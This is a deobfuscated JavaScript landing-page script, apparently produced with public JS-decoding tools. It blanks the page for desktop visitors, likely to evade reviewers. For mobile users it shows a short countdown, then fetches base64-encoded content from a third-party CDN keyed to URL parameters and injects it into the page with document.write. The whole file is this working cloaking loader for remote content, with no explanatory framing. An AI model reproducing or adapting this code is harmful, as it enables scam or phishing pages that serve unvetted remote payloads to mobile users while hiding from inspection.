//Thu Jan 08 2026 05:39:45 GMT+0000 (Coordinated Universal Time)
//Base:<url id="cv1cref6o68qmpt26ol0" type="url" status="parsed" title="GitHub - echo094/decode-js: JS混淆代码的AST分析工具 AST analysis tool for obfuscated JS code" wc="2165">https://github.com/echo094/decode-js</url>
//Modify:<url id="cv1cref6o68qmpt26olg" type="url" status="parsed" title="GitHub - smallfawn/decode_action: 世界上本来不存在加密，加密的人多了，也便成就了解密" wc="741">https://github.com/smallfawn/decode_action</url>
(function () {})();
document.addEventListener("DOMContentLoaded", function () {
  (!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || /^(Win|Mac)/i.test(navigator.platform)) && (document.head.innerHTML = "", document.body.innerHTML = "");
  const IIi1II1 = document.getElementById("countdownNumber"),
    lIli1lI = document.getElementById("backgroundElements"),
    Ili1ilIl = new Date().toISOString().slice(0, 10).replace(/-/g, "");
  let liIl1l11 = 3,
    Il1iili,
    ilI1i11l;
  iIi1illl();
  function iIi1illl() {
    i1ilIII();
    IIi1II1.textContent = liIl1l11 + "s";
    liIl1l11 <= 0 && (I1i1II1I(), clearInterval(Il1iili), clearInterval(ilI1i11l), IIi1II1.textContent = "");
  }
  function i1ilIII() {
    for (let ll11lIl = 0; ll11lIl < 10; ll11lIl++) {
      {
        const iIl1iiI1 = document.createElement("div");
        iIl1iiI1.className = "star";
        const illi1lIl = Math.random() * 4 + 2;
        iIl1iiI1.style.width = illi1lIl + "px";
        iIl1iiI1.style.height = illi1lIl + "px";
        iIl1iiI1.style.left = Math.random() * 100 + "%";
        iIl1iiI1.style.top = Math.random() * 100 + "%";
        iIl1iiI1.style.animationDelay = Math.random() * 3 + "s";
        iIl1iiI1.style.opacity = Math.random() * 0.7 + 0.3;
        lIli1lI.appendChild(iIl1iiI1);
      }
    }
  }
  function I1i1II1I() {
    const l1Ii1i1I = iilIi1("t") ? "t=" + iilIi1("t") : "s=" + iilIi1("s");
    fetch("//ce9e386c79c8eac7.cdn.jiashule.com/cdn/get.js?" + l1Ii1i1I + "&ts=" + Ili1ilIl).then(liI1ii1i => liI1ii1i.json()).then(l1illill => {
      {
        if (l1illill.code == 200) {
          {
            const ilIliIil = decodeURIComponent(window.atob(l1illill.data));
            document.write(ilIliIil);
          }
        } else {
          document.head.innerHTML = "";
          document.body.innerHTML = "";
        }
      }
    }).catch(IIliI11I => {
      document.querySelectorAll(".dot").forEach(li1iI1il => {
        li1iI1il.style.animation = "none";
        li1iI1il.style.display = "none";
      });
      IIi1II1.style = "font-size:14px;color:#000000;white-space:nowrap;";
      IIi1II1.textContent = "网络错误请重试！";
    });
  }
  function iilIi1(lillIIl1) {
    var iiI1illl = window.location.hash.substring(1) || window.location.search.substring(1),
      IIIiI1i1 = iiI1illl.split("&");
    for (var Iiiillii = 0; Iiiillii < IIIiI1i1.length; Iiiillii++) {
      var ii1I1i1i = IIIiI1i1[Iiiillii].split("=");
      if (ii1I1i1i[0] == lillIIl1) return ii1I1i1i[1];
    }
    return false;
  }
  Il1iili = setInterval(() => {
    liIl1l11--;
    iIi1illl();
  }, 1000);
  ilI1i11l = setInterval(() => {
    IIi1II1.style.transform = "translate(-50%, -50%) scale(1.1)";
    setTimeout(() => {
      IIi1II1.style.transform = "translate(-50%, -50%) scale(1)";
    }, 200);
  }, 1000);
});